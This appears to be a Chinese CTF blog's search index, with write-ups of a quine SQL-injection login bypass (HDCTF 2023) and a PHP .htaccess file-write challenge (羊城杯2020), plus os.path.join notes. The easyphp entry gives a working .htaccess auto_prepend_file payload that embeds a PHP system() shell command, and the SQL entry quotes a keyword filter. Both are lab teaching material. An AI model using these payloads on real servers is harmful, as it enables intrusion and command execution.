<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/07/07/%5BHDCTF%202023%5DLoginMaster/"/>
    <url>/2023/07/07/%5BHDCTF%202023%5DLoginMaster/</url>
    
    <content type="html"><![CDATA[<h1 id="HDCTF-2023-LoginMaster"><a href="#HDCTF-2023-LoginMaster" class="headerlink" title="[HDCTF 2023]LoginMaster"></a>[HDCTF 2023]LoginMaster</h1><p>登陆界面，大概率就是sql注入了，随便输入一些东西后，提示需要用admin登陆，然后在尝试很多语句后无果，发现在robots.txt中有源码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkSql</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="hljs-variable">$s</span>))&#123;<br>        <span class="hljs-title function_ invoke__">alertMes</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-string">&#x27;index.php&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>] === <span class="hljs-variable">$password</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable">$FLAG</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">alertMes</span>(<span class="hljs-string">&quot;wrong password&quot;</span>,<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><br></code></pre></td></tr></table></figure><p>发现只是对password进行过滤并且输出flag的条件是password的输入和输出完全相等的时候会输出flag。</p><p>一般的思路已经是行不通了，需要特殊手法了。</p><p>这里也是第一次接触Quine注入也是看了不少文章，找到一篇让我理解通透的</p><p>[Quine]:<a href="https://www.cnblogs.com/zhengna/p/15917521.html">CTFHub_2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine注入） - zhengna - 博客园 (cnblogs.com)</a></p><p>这里运用到的<strong>replace</strong>函数；</p><p>sql中用法：replace(str,from str,to stri)直白的说就是把str中出现的from str替换为to str。</p><p>例子</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">replace(<span class="hljs-string">&#x27;abc&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>);输出就是bce。<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;注&#x3D;&#x3D;</p><p>第一个参数可以是字符串或者二进制数据</p><p>第二个数据同样可以是字符串或者二进制数据，但是不能为空字符串</p><p>第三个同样也可以是字符串或者二进制数据。</p><h2 id="进入正题"><a href="#进入正题" class="headerlink" title="进入正题"></a>进入正题</h2><p>如何做到让输入和输出一样呢，先到本地测试</p><p>一步一步的进行测试</p><p>首先</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">测试只使用一个replace会怎么样<br>select replace(<span class="hljs-emphasis">&#x27;.&#x27;</span>,<span class="hljs-emphasis">&#x27;char(46)&#x27;</span>,<span class="hljs-emphasis">&#x27;.&#x27;</span>);<br><span class="hljs-section">mysql&gt; select replace(&#x27;.&#x27;,&#x27;char(46)&#x27;,&#x27;.&#x27;);</span><br><span class="hljs-section">+-----------------------------+</span><br><span class="hljs-section">| replace(&#x27;.&#x27;,&#x27;char(46)&#x27;,&#x27;.&#x27;) |</span><br><span class="hljs-section">+-----------------------------+</span><br><span class="hljs-section">| .                           |</span><br><span class="hljs-section">+-----------------------------+</span><br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>只出现了一个’.’那么怎么能够让他输入输出一样呢，上一个例子中如果我们把第一个参数修改为replace(‘.’,’char(46)’,’.’)呢他会输出什么，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> replace(<span class="hljs-string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>,<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),<span class="hljs-string">&#x27;.&#x27;</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------------------------+</span><br><span class="hljs-operator">|</span> replace(<span class="hljs-string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>,<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),<span class="hljs-string">&#x27;.&#x27;</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------------------------+</span><br><span class="hljs-operator">|</span> replace(&quot;.&quot;,<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),&quot;.&quot;)                         <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><p>这里可以看到了返回了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">replace(&quot;.&quot;,<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),&quot;.&quot;)<br></code></pre></td></tr></table></figure><p>这么就有新的思路把第三个参数也换成replace(“.”,char(46),”.”)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> replace(<span class="hljs-string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>,<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),<span class="hljs-string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>);<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------------------------------------------------+</span><br><span class="hljs-operator">|</span> replace(<span class="hljs-string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>,<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),<span class="hljs-string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------------------------------------------------+</span><br><span class="hljs-operator">|</span> replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------------------------------------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><p>这里仔细会发现在单引号和双引号会有不同</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">+</span><span class="hljs-comment">------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="hljs-operator">|</span> replace(replace(<span class="hljs-string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="hljs-type">char</span>(<span class="hljs-number">34</span>),<span class="hljs-type">char</span>(<span class="hljs-number">39</span>)),<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),<span class="hljs-string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="hljs-operator">|</span> replace(replace(<span class="hljs-string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="hljs-type">char</span>(<span class="hljs-number">34</span>),<span class="hljs-type">char</span>(<span class="hljs-number">39</span>)),<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),<span class="hljs-string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>os.path.join</title>
    <link href="/2023/05/14/python%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/"/>
    <url>/2023/05/14/python%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/</url>
    
    <content type="html"><![CDATA[<h1 id="os-path-join-函数"><a href="#os-path-join-函数" class="headerlink" title="os.path.join()函数"></a>os.path.join()函数</h1><p>针对自己做的一个基于python的文件上传问题，这个函数意思就是连接两个或多个路径名分量</p><h2 id="如果各个路径名前没有加”-x2F-“-函数运行后，会自动加上”-x2F-“"><a href="#如果各个路径名前没有加”-x2F-“-函数运行后，会自动加上”-x2F-“" class="headerlink" title="如果各个路径名前没有加”&#x2F;“,函数运行后，会自动加上”&#x2F;“."></a>如果各个路径名前没有加”&#x2F;“,函数运行后，会自动加上”&#x2F;“.</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>path1=<span class="hljs-string">&#x27;bin&#x27;</span> <br>path2=<span class="hljs-string">&#x27;flag&#x27;</span><br>path3=<span class="hljs-string">&#x27;bot&#x27;</span><br><span class="hljs-built_in">all</span>=os.path.join(path1,path2,path3)<br>path=path1+path2+path3<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;all_=&quot;</span>+<span class="hljs-built_in">all</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;path_=&quot;</span>+path)<br><span class="hljs-comment">#path后面的变量即路径名</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">all_=<span class="hljs-built_in">bin</span>\flag\bot<br>path_=binflagbot  <span class="hljs-comment">#运行后</span><br></code></pre></td></tr></table></figure><h2 id="各组件名首字母包含’-x2F-’的情况"><a href="#各组件名首字母包含’-x2F-’的情况" class="headerlink" title="各组件名首字母包含’&#x2F;’的情况"></a>各组件名首字母包含’&#x2F;’的情况</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>path1=<span class="hljs-string">&#x27;/bin&#x27;</span> <br>path2=<span class="hljs-string">&#x27;flag&#x27;</span><br>path3=<span class="hljs-string">&#x27;bot&#x27;</span><br><span class="hljs-built_in">all</span>=os.path.join(path1,path2,path3)<br>path=path1+path2+path3<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;all_=&quot;</span>+<span class="hljs-built_in">all</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;path_=&quot;</span>+path)<br><span class="hljs-comment">#path后面的变量即路径名</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">all_=/<span class="hljs-built_in">bin</span>\flag\bot<br>path_=/binflagbot  <span class="hljs-comment">#运行后</span><br></code></pre></td></tr></table></figure><h2 id="如果有一个路径是一个绝对路径，则在它之前的所有路径均会被舍弃"><a href="#如果有一个路径是一个绝对路径，则在它之前的所有路径均会被舍弃" class="headerlink" title="如果有一个路径是一个绝对路径，则在它之前的所有路径均会被舍弃"></a>如果有一个路径是一个绝对路径，则在它之前的所有路径均会被舍弃</h2><p>写法如以上两种情况只不过，&#x2F;的位置放的不一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>path1=<span class="hljs-string">&#x27;bin&#x27;</span><br>path2=<span class="hljs-string">&#x27;/flag&#x27;</span><br>path3=<span class="hljs-string">&#x27;bot&#x27;</span><br><span class="hljs-built_in">all</span>=os.path.join(path1,path2,path3)<br>path=path1+path2+path3<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;all_=&quot;</span>+<span class="hljs-built_in">all</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;path_=&quot;</span>+path)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">all_=/flag\bot<br>path_=<span class="hljs-built_in">bin</span>/flagbot<br></code></pre></td></tr></table></figure><p>这时候就可以看到，os.path.join函数运行后绝对路径前面的路径自动舍弃</p><h2 id="如果最后一个路径为空，则生成的路径以一个’-x2F-’分隔符结尾"><a href="#如果最后一个路径为空，则生成的路径以一个’-x2F-’分隔符结尾" class="headerlink" title="如果最后一个路径为空，则生成的路径以一个’&#x2F;’分隔符结尾"></a>如果最后一个路径为空，则生成的路径以一个’&#x2F;’分隔符结尾</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>path1=<span class="hljs-string">&#x27;bin&#x27;</span><br>path2=<span class="hljs-string">&#x27;/flag&#x27;</span><br>path3=<span class="hljs-string">&#x27; &#x27;</span><br><span class="hljs-built_in">all</span>=os.path.join(path1,path2,path3)<br>path=path1+path2+path3<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;all_=&quot;</span>+<span class="hljs-built_in">all</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;path_=&quot;</span>+path)<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">all_=/flag\ <br>path_=<span class="hljs-built_in">bin</span>/flag <br><br></code></pre></td></tr></table></figure><h2 id="如果不显示地添加斜杠‘-x2F-’，那么程序会自动添加反斜杠‘-’"><a href="#如果不显示地添加斜杠‘-x2F-’，那么程序会自动添加反斜杠‘-’" class="headerlink" title="如果不显示地添加斜杠‘&#x2F;’，那么程序会自动添加反斜杠‘\’"></a>如果不显示地添加斜杠‘&#x2F;’，那么程序会自动添加反斜杠‘\’</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-built_in">print</span>(os.path.join(<span class="hljs-string">&#x27;path1&#x27;</span>,<span class="hljs-string">&#x27;path2&#x27;</span>,<span class="hljs-string">&#x27;path3&#x27;</span>))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">path1\path2\path3<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>羊城杯2020-easyphp</title>
    <link href="/2023/05/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-easyphp/"/>
    <url>/2023/05/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-easyphp/</url>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;on&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;html&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;type&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;flag&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;upload&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;file&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[^a-z\.]/&quot;</span>, <span class="hljs-variable">$filename</span>) == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span> . <span class="hljs-string">&quot;\nHello, world&quot;</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>逐个解释</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>意思就是如果不是index.php页面，就会删除页面数据</p><p>下一个if判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">die</span>();<br></code></pre></td></tr></table></figure><p>如果没有传入content和filename就会直接die</p><p>下一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;on&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;html&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;type&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;flag&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;upload&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;file&#x27;</span>)) &#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>       <span class="hljs-keyword">die</span>();<br>   &#125;<br></code></pre></td></tr></table></figure><p>对参数content进行过滤，如果检测到有这些字符会直接输出Hacker并且die。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[^a-z\.]/&quot;</span>, <span class="hljs-variable">$filename</span>) == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p>对参数filename进行过滤意思就是filename参数后面只能由小写字母和”.”构成，否则就die。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span> . <span class="hljs-string">&quot;\nHello, world&quot;</span>);<br></code></pre></td></tr></table></figure><p>最后一个就是传入的content内容会写到filename里面，但是后面拼接一个”Hello, world”后面解析会直接造成我们程序错误。</p><p>然后这时候就可以想到有什么可以比index.php先执行，.htaccess文件，配置文件是比index.php先执行的，所以就利用.htaccess文件将配置项改一下。写入木马并能执行的。同时还要绕过关键字file，还要不能被后面拼接的Hello, world所影响。所以可以采用拼接的方式把file拼接成两部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs .htaccess">php_value auto_prepend_fil\<br>e.htaccess<br>#&lt;?php system(&#x27;cat /fla?&#x27;); ?&gt;\<br></code></pre></td></tr></table></figure><p>最后一行加的符号#是htaccess里面的注释，最后的\是拼接的意思，把后面的Hello, world也给注释掉，这样就不会发生报错，而php执行时木马则会被执行。</p><p>最后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">filename=.htaccess&amp;content=php_value%<span class="hljs-number">20</span>auto_prepend_fil%<span class="hljs-number">5</span>C%<span class="hljs-number">0</span>Ae%<span class="hljs-number">20</span>.htaccess%<span class="hljs-number">0</span>A%<span class="hljs-number">23</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">20</span>system(<span class="hljs-string">&#x27;cat%20/fla?&#x27;</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">5</span>C<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>.htaccess</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GDOUCTF 2023受不了一点</title>
    <link href="/2023/05/06/GDOUCTF-2023%E5%8F%97%E4%B8%8D%E4%BA%86%E4%B8%80%E7%82%B9/"/>
    <url>/2023/05/06/GDOUCTF-2023%E5%8F%97%E4%B8%8D%E4%BA%86%E4%B8%80%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>打开后源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td 